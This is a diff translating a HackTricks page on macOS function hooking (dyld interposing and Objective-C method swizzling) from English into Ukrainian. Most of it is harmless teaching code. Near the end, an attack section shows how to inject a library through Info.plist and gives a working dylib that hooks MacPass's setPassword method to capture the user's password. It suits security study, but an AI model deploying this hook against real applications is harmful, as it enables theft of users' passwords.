@@ -1,26 +1,26 @@
-# macOS Function Hooking
+# Підключення функцій macOS
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
 
-## Function Interposing
+## Перехоплення функцій
 
-Create a **dylib** with an **`__interpose`** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.
+Створіть **dylib** з розділом **`__interpose`** (або розділом, позначеним як **`S_INTERPOSING`**), що містить кортежі **вказівників на функції**, які посилаються на **оригінальні** та **замінні** функції.
 
-Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app loads). Obviously the [**restrictions** applied to the use of **`DYLD_INSERT_LIBRARIES`** applies here also](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
+Потім **впровадьте** dylib за допомогою **`DYLD_INSERT_LIBRARIES`** (перехоплення повинно відбуватися до завантаження основного додатка). Очевидно, [**обмеження**, застосовані до використання **`DYLD_INSERT_LIBRARIES`**, також застосовуються тут](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
 
-### Interpose printf
+### Перехоплення printf
 
 {% tabs %}
 {% tab title="interpose.c" %}
@@ -31,13 +31,13 @@ Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing nee
 #include <stdarg.h>
 
 int my_printf(const char *format, ...) {
-    //va_list args;
-    //va_start(args, format);
-    //int ret = vprintf(format, args);
-    //va_end(args);
+//va_list args;
+//va_start(args, format);
+//int ret = vprintf(format, args);
+//va_end(args);
 
-    int ret = printf("Hello from interpose\n");
-    return ret;
+int ret = printf("Hello from interpose\n");
+return ret;
 }
 
 __attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
@@ -52,8 +52,8 @@ __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned lon
 #include <stdio.h>
 
 int main() {
-    printf("Hello World!\n");
-    return 0;
+printf("Hello World!\n");
+return 0;
 }
 ```
 {% endtab %}
@@ -66,25 +66,24 @@ int main() {
 #include <stdio.h>
 
 #define DYLD_INTERPOSE(_replacement, _replacee) \
-    __attribute__((used)) static struct { \
-        const void* replacement; \
-        const void* replacee; \
-    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
-        (const void*) (unsigned long) &_replacement, \
-        (const void*) (unsigned long) &_replacee \
-    };
+__attribute__((used)) static struct { \
+const void* replacement; \
+const void* replacee; \
+} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
+(const void*) (unsigned long) &_replacement, \
+(const void*) (unsigned long) &_replacee \
+};
 
 int my_printf(const char *format, ...)
 {
-    int ret = printf("Hello from interpose\n");
-    return ret;
+int ret = printf("Hello from interpose\n");
+return ret;
 }
 
 DYLD_INTERPOSE(my_printf,printf);
 ```
 {% endtab %}
 {% endtabs %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
 Hello from interpose
@@ -92,25 +91,23 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
+## Метод Swizzling
 
-## Method Swizzling
+У ObjectiveC так викликається метод: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
-In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
+Потрібен **об'єкт**, **метод** та **параметри**. І коли метод викликається, **повідомлення відправляється** за допомогою функції **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
-It's needed the **object**, the **method** and the **params**. And when a method is called a **msg is sent** using the function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
+Об'єкт - **`someObject`**, метод - **`@selector(method1p1:p2:)`**, аргументи - **value1**, **value2**.
 
-The object is **`someObject`**, the method is **`@selector(method1p1:p2:)`** and the arguments are **value1**, **value2**.
-
-Following the object structures, it's possible to reach an **array of methods** where the **names** and **pointers** to the method code are **located**.
+Слідуючи структурам об'єктів, можна дістатися до **масиву методів**, де **імена** та **вказівники** на код методу **знаходяться**.
 
 {% hint style="danger" %}
-Note that because methods and classes are accessed based on their names, this information is store in the binary, so it's possible to retrieve it with `otool -ov </path/bin>` or [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
+Зверніть увагу, що оскільки методи та класи доступні за їхніми іменами, ця інформація зберігається в бінарному файлі, тому можна отримати її за допомогою `otool -ov </path/bin>` або [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
 {% endhint %}
 
-### Accessing the raw methods
+### Доступ до сирого методу
 
-It's possible to access the information of the methods such as name, number of params or address like in the following example:
-
+Можливо отримати доступ до інформації про методи, таку як ім'я, кількість параметрів або адресу, як у наступному прикладі:
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -119,72 +116,70 @@ It's possible to access the information of the methods such as name, number of p
 #import <objc/message.h>
 
 int main() {
-    // Get class of the variable
-    NSString* str = @"This is an example";
-    Class strClass = [str class];
-    NSLog(@"str's Class name: %s", class_getName(strClass));
+// Get class of the variable
+NSString* str = @"This is an example";
+Class strClass = [str class];
+NSLog(@"str's Class name: %s", class_getName(strClass));
 
-    // Get parent class of a class
-    Class strSuper = class_getSuperclass(strClass); 
-    NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));
+// Get parent class of a class
+Class strSuper = class_getSuperclass(strClass);
+NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));
 
-    // Get information about a method
-    SEL sel = @selector(length);
-    NSLog(@"Selector name: %@", NSStringFromSelector(sel));
-    Method m = class_getInstanceMethod(strClass,sel);
-    NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
-    NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));
+// Get information about a method
+SEL sel = @selector(length);
+NSLog(@"Selector name: %@", NSStringFromSelector(sel));
+Method m = class_getInstanceMethod(strClass,sel);
+NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
+NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));
 
-    // Iterate through the class hierarchy
-    NSLog(@"Listing methods:");
-    Class currentClass = strClass;
-    while (currentClass != NULL) {
-        unsigned int inheritedMethodCount = 0;
-        Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);
-        
-        NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);
-        
-        for (unsigned int i = 0; i < inheritedMethodCount; i++) {
-            Method method = inheritedMethods[i];
-            SEL selector = method_getName(method);
-            const char* methodName = sel_getName(selector);
-            unsigned long address = (unsigned long)method_getImplementation(m);
-            NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
-        }
-        
-        // Free the memory allocated by class_copyMethodList
-        free(inheritedMethods);
-        currentClass = class_getSuperclass(currentClass);
-    }
+// Iterate through the class hierarchy
+NSLog(@"Listing methods:");
+Class currentClass = strClass;
+while (currentClass != NULL) {
+unsigned int inheritedMethodCount = 0;
+Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);
 
-    // Other ways to call uppercaseString method
-    if([str respondsToSelector:@selector(uppercaseString)]) {
-        NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
-        NSLog(@"Uppercase string: %@", uppercaseString);
-    }
+NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);
 
-    // Using objc_msgSend directly
-    NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
-    NSLog(@"Uppercase string: %@", uppercaseString2);
+for (unsigned int i = 0; i < inheritedMethodCount; i++) {
+Method method = inheritedMethods[i];
+SEL selector = method_getName(method);
+const char* methodName = sel_getName(selector);
+unsigned long address = (unsigned long)method_getImplementation(m);
+NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
+}
 
-    // Calling the address directly
-    IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
-    NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
-    NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
-    NSLog(@"Uppercase string: %@", uppercaseString3);
+// Free the memory allocated by class_copyMethodList
+free(inheritedMethods);
+currentClass = class_getSuperclass(currentClass);
+}
 
-    return 0;
+// Other ways to call uppercaseString method
+if([str respondsToSelector:@selector(uppercaseString)]) {
+NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
+NSLog(@"Uppercase string: %@", uppercaseString);
+}
+
+// Using objc_msgSend directly
+NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
+NSLog(@"Uppercase string: %@", uppercaseString2);
+
+// Calling the address directly
+IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
+NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
+NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
+NSLog(@"Uppercase string: %@", uppercaseString3);
+
+return 0;
 }
 ```
+### Заміна методу за допомогою method\_exchangeImplementations
 
-### Method Swizzling with method\_exchangeImplementations
-
-The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.
+Функція **`method_exchangeImplementations`** дозволяє **змінити** **адресу реалізації** однієї функції на іншу.
 
 {% hint style="danger" %}
-So when a function is called what is **executed is the other one**.
+Таким чином, коли викликається функція, виконується **інша**.
 {% endhint %}
-
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -202,45 +197,43 @@ So when a function is called what is **executed is the other one**.
 @implementation NSString (SwizzleString)
 
 - (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
-    NSLog(@"Custom implementation of substringFromIndex:");
-    
-    // Call the original method
-    return [self swizzledSubstringFromIndex:from];
+NSLog(@"Custom implementation of substringFromIndex:");
+
+// Call the original method
+return [self swizzledSubstringFromIndex:from];
 }
 
 @end
 
 int main(int argc, const char * argv[]) {
-    // Perform method swizzling
-    Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
-    Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
-    method_exchangeImplementations(originalMethod, swizzledMethod);
+// Perform method swizzling
+Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
+Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
+method_exchangeImplementations(originalMethod, swizzledMethod);
 
-    // We changed the address of one method for the other
-    // Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
-    // And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
-    
-    // Example usage
-    NSString *myString = @"Hello, World!";
-    NSString *subString = [myString substringFromIndex:7];
-    NSLog(@"Substring: %@", subString);
-    
-    return 0;
+// We changed the address of one method for the other
+// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
+// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
+
+// Example usage
+NSString *myString = @"Hello, World!";
+NSString *subString = [myString substringFromIndex:7];
+NSLog(@"Substring: %@", subString);
+
+return 0;
 }
 ```
-
 {% hint style="warning" %}
-In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.
+У цьому випадку, якщо **реалізаційний код легітимного** методу **перевіряє** **ім'я методу**, він може **виявити** цей перехоплення та запобігти йому виконання.
 
-The following technique doesn't have this restriction.
+Наступна техніка не має цього обмеження.
 {% endhint %}
 
-### Method Swizzling with method\_setImplementation
+### Перехоплення методу за допомогою method\_setImplementation
 
-The previous format is weird because you are changing the implementation of 2 methods one from the other. Using the function **`method_setImplementation`** you can **change** the **implementation** of a **method for the other one**.
+Попередній формат дивний, оскільки ви змінюєте реалізацію 2 методів один на одного. Використовуючи функцію **`method_setImplementation`**, ви можете **змінити реалізацію методу на інший**.
 
-Just remember to **store the address of the implementation of the original one** if you are going to to call it from the new implementation before overwriting it because later it will be much complicated to locate that address.
-
+Просто не забудьте **зберегти адресу реалізації оригінального**, якщо ви збираєтеся викликати його з нової реалізації перед її перезаписом, оскільки пізніше буде набагато складніше знайти цю адресу.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -257,63 +250,60 @@ static IMP original_substringFromIndex = NULL;
 @implementation NSString (Swizzlestring)
 
 - (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
-    NSLog(@"Custom implementation of substringFromIndex:");
-        
-    // Call the original implementation using objc_msgSendSuper
-    return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
+NSLog(@"Custom implementation of substringFromIndex:");
+
+// Call the original implementation using objc_msgSendSuper
+return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
 }
 
 @end
 
 int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        // Get the class of the target method
-        Class stringClass = [NSString class];
-        
-        // Get the swizzled and original methods
-        Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
-        
-        // Get the function pointer to the swizzled method's implementation
-        IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));
-        
-        // Swap the implementations
-        // It return the now overwritten implementation of the original method to store it
-        original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
-        
-        // Example usage
-        NSString *myString = @"Hello, World!";
-        NSString *subString = [myString substringFromIndex:7];
-        NSLog(@"Substring: %@", subString);
-        
-        // Set the original implementation back
-        method_setImplementation(originalMethod, original_substringFromIndex);
-        
-        return 0;
-    }
+@autoreleasepool {
+// Get the class of the target method
+Class stringClass = [NSString class];
+
+// Get the swizzled and original methods
+Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
+
+// Get the function pointer to the swizzled method's implementation
+IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));
+
+// Swap the implementations
+// It return the now overwritten implementation of the original method to store it
+original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
+
+// Example usage
+NSString *myString = @"Hello, World!";
+NSString *subString = [myString substringFromIndex:7];
+NSLog(@"Substring: %@", subString);
+
+// Set the original implementation back
+method_setImplementation(originalMethod, original_substringFromIndex);
+
+return 0;
+}
 }
 ```
+## Методологія атаки за допомогою підключення функцій
 
-## Hooking Attack Methodology
+На цій сторінці обговорюються різні способи підключення функцій. Однак вони передбачають **виконання коду всередині процесу для атаки**.
 
-In this page different ways to hook functions were discussed. However, they involved **running code inside the process to attack**.
+Для цього найпростішою технікою є впровадження [Dyld через змінні середовища або перехоплення](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Проте, я вважаю, що це також можна зробити через [впровадження процесу Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
 
-In order to do that the easiest technique to use is to inject a [Dyld via environment variables or hijacking](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md). However, I guess this could also be done via [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
+Проте обидва варіанти обмежені **незахищеними** бінарними файлами/процесами. Перевірте кожну техніку, щоб дізнатися більше про обмеження.
 
-However, both options are **limited** to **unprotected** binaries/processes. Check each technique to learn more about the limitations.
+Проте атака підключення функцій є дуже конкретною, зловмисник буде робити це, щоб **викрасти чутливу інформацію зсередини процесу** (якщо цього не зробити, то ви просто здійсните атаку впровадження процесу). І ця чутлива інформація може бути розташована в завантажених користувачем додатках, таких як MacPass.
 
-However, a function hooking attack is very specific, an attacker will do this to **steal sensitive information from inside a process** (if not you would just do a process injection attack). And this sensitive information might be located in user downloaded Apps such as MacPass.
-
-So the attacker vector would be to either find a vulnerability or strip the signature of the application, inject the **`DYLD_INSERT_LIBRARIES`** env variable through the Info.plist of the application adding something like:
-
+Таким чином, вектор атаки зловмисника полягатиме в тому, щоб знайти вразливість або зняти підпис програми, впровадити змінну середовища **`DYLD_INSERT_LIBRARIES`** через Info.plist програми, додавши щось на зразок:
 ```xml
 <key>LSEnvironment</key>
 <dict>
-    <key>DYLD_INSERT_LIBRARIES</key> 
-    <string>/Applications/Application.app/Contents/malicious.dylib</string>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-
-and then **re-register** the application:
+і потім **перереєструвати** додаток:
 
 {% code overflow="wrap" %}
 ```bash
@@ -321,14 +311,13 @@ and then **re-register** the application:
 ```
 {% endcode %}
 
-Add in that library the hooking code to exfiltrate the information: Passwords, messages...
+Додайте до цієї бібліотеки код підміни для виведення інформації: паролі, повідомлення...
 
 {% hint style="danger" %}
-Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.
+Зверніть увагу, що в новіших версіях macOS, якщо ви **видалите підпис** з бінарного файлу програми і він вже виконувався раніше, macOS **більше не буде виконувати програму**.
 {% endhint %}
 
-#### Library example
-
+#### Приклад бібліотеки
 ```objectivec
 // gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
 
@@ -345,40 +334,39 @@ static IMP real_setPassword = NULL;
 
 static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
 {
-    // Function that will log the password and call the original setPassword(pass, file_path) method
-    NSLog(@"[+] Password is: %@", password);
-    
-    // After logging the password call the original method so nothing breaks.
-    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
+// Function that will log the password and call the original setPassword(pass, file_path) method
+NSLog(@"[+] Password is: %@", password);
+
+// After logging the password call the original method so nothing breaks.
+return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
 }
 
 // Library constructor to execute
 __attribute__((constructor))
 static void customConstructor(int argc, const char **argv) {
-    // Get the real method address to not lose it
-    Class classMPDocument = NSClassFromString(@"MPDocument");
-    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
-    
-    // Make the original method setPassword call the fake implementation one
-    IMP fake_IMP = (IMP)custom_setPassword;
-    real_setPassword = method_setImplementation(real_Method, fake_IMP);
+// Get the real method address to not lose it
+Class classMPDocument = NSClassFromString(@"MPDocument");
+Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
+
+// Make the original method setPassword call the fake implementation one
+IMP fake_IMP = (IMP)custom_setPassword;
+real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
-
-## References
+## Посилання
 
 * [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
